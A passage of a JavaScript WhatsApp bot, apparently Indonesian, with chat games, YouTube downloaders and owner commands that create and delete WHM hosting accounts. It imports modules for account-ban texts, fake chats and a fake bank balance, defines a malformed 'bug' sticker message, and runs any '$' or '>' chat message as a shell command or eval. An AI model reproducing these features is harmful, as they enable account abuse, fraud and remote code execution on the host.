 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await Biiofc.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Biiofc.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}

}
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
Biiofc.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
Biiofc.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) Biiofc.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) Biiofc.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) Biiofc.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
Biiofc.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) Biiofc.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) Biiofc.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
Biiofc.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}

}
//ssweb
const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/wait.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/admin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/owner.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/group.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
// TEXT BANNED
const { textbanv1, textbanv2, textbanv3, textbanv4, textbanv5, textbanv6, textbanv7, textbanv8, textbanv9, textbanv10, textbanv11, textbanv12, textbanv13, textbanv14, textbanv15, textbanv16, textbanv17, textbanv18, textbanv19, textbanv20, textbanv21, textbanv22, textbanv23, textbanv24, textbanv25, textbanv26, textbanv27, textbanv28, textbanv29, textbanv30, textbanv31, textbanv32, textbanv33, textbanv34, textbanv35, textbanv36, textbanv37, textbanv38 } = require('./wangsap/textban.js')

// TEXT UNBANNED
const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('./wangsap/textunban.js')

// TEXT FAKE CHAT 
const { fakec1, fakec2, fakec3, fakec4, fakec5, fakec6, fakec7, fakec8, fakec9, fakec10, fakec11 } = require('./wangsap/fakechat.js')

// TOTAL FITUR
const { totalfakechat, totalunban, totalban } = require('./wangsap/total.js')

// TEXT TOOLS
const { tools1, tools2 } = require('./wangsap/tools.js')

// SALDO BRIMO
const { saldoo } = require('./wangsap/saldoo.js')

//pickRandom
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `᭖͜͡FERDYNESIA`, 'vcard': `BEGIN:VCARD\nVERSION:9.0\nN:XL;BiiofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
  async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `𝗖𝗲𝗸𝗶𝗹-𝗠𝗱`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}


  //buttons Tambahan
const ntiktok = ('© alfiboysss')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Biiofc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Biiofc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

let authWhm = {headers: {Authorization: `WHM ${usrwhm}:${tokenwhm}`}}

let vote = db.others.vote = []

let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`
switch (command) {

//CASE NdraCloudHost
case 'menu':
case 'allmenu':
m.reply(`
----------------------------------------
     乂 MENU 乂
----------------------------------------
◇ ‣ . hostingmenu
◇ ‣ . panelmenu
◇ ‣ . digitaloceanmenu
◇ ‣ . linodemenu
◇ ‣ . add ( nomor/tag )
◇ ‣ . del ( nomor/tag )
◇ ‣ . creategroup ( membuat group )
◇ ‣ . self ( bot mode seleb 🗿 )
◇ ‣ . public ( bot mode prenli 🗿 )
----------------------------------------`)
break

case 'allmenu':
m.reply(`
----------------------------------------
   乂 HOSTING 乂
----------------------------------------
◇ ‣ . createakun
◇ ‣ . listakun
◇ ‣ . termint
◇ ‣ . listpackage
----------------------------------------`)
break

case 'createakun':
if (!isOwner) return m.reply('Command Khusus Owner Ya Deck')
if (!q) return m.reply(`*CREATE AKUN*\nExample:\n#${command} username|domain|package\n\nContoh:\n#${command} Ndra|ndra.whm|Whm Mini`)
let usern = q.split('|')[0]
let domainnye = q.split('|')[1] 
let pekeg = q.split('|')[2]
if (!domainnye) return m.reply('Domain wajib di isi!!')
if (!pekeg) return m.reply('Package Wajib di isi!!')
m.reply('Sabar Cuk Lagi Buat Akun ⏳')
await axios.get(`https://${hostwhm}:2087/json-api/createacct?api.version=2&username=${usern}&contactemail=ndracloudhost@gmail.com&plan=${pekeg}&domain=${domainnye}`, authWhm)
.then(response => {     
let np = response.data
if (np.metadata.result == 0) {
m.reply(np.metadata.reason)
} else {
let dsta = np.metadata.output.raw;
var substr = dsta.substring(
dsta.toString().indexOf("+===================================+")
); //substr = 'word. Hello!'
let xxybot = substr.split("| Language: en")[0];
m.reply(`${xxybot}\n\nLogin : https://${hostwhm}:2087`)
}});
break

case 'listakun':
if (!isOwner) return m.reply('Command Khusus Owner Ya Deck')
m.reply('Tunggu, Sedang Meminta Informasi Dari Server....')
await axios.get(`https://${hostwhm}:2087/json-api/listaccts?api.version=2`, authWhm)
.then((risol) => {
let lisol = risol.data
var ttdy = lisol.data.acct
let ogh = `*── 「 LIST AKUN 」 ──*\nTotal Akun : ${ttdy.length}\n`
for (let i = 0; i < ttdy.length; i++) {
ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ IP* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`
}
m.reply(ogh)
})
break

case 'termint':
if (!isOwner) return m.reply('Command Khusus Owner Ya Deck')
if (args.length < 2) return m.reply(`Kirim perintah #${command} username`)
m.reply('Tunggu Sedang Menghapus Akun....')
await axios
.get(
`https://${hostwhm}:2087/json-api/removeacct?api.version=2&username=${args[1]}`, authWhm )
.then((e) => {
if ([1, "1"].includes(e.data?.metadata?.result))
m.reply(`Done User ${q} Telah di Terminate`);
else {
m.reply(e.metadata);
console.log(e.data);
}
})
break

case 'listpackage':
m.reply(`
]-------List Package-----[

*CPANEL*
• cPanel Mini
• cPanel Medium
• cPanel Extra
• cPanel Super

*WHM*
• Whm Mini
• Whm Medium
• Whm Extra
• Whm Super

*MWHM*
• Mwhm Mini
• Mwhm Medium
• Mwhm Extra
• Mwhm Super

*RESELLER*
• Admin
• Ceo
• Wakil Founder

Contoh Penggunaan : 
.createakun ndra|ndra.whm|Whm Mini`)
break

default:
}
if (budy.startsWith('$')) {
if (!isOwner) return reply(`CIEE MAU COLONG SC OWNER`)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})